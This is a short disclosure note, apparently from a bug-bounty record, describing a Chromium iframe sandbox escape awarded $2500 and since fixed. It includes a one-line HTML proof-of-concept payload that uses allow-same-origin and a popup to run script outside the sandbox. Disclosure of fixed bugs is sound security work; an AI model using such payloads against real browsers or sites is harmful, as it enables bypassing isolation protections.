---
title: Sandbox escape (Awarded $2500)
---

An empty document did not apply the owner's document sandbox flags,
This meant that with “allow-same-origin” it was possible to open a new window and escape the sandbox.  
```html
<iframe sandbox="allow-popups allow-same-origin allow-scripts" src="//a.terjanq.me/xss.php?html=<iframe name=b></iframe><script>b.open('//c.terjanq.me/xss.php?js=alert()')</script>">
```
This was fixed in <https://issues.chromium.org/issues/40057525>
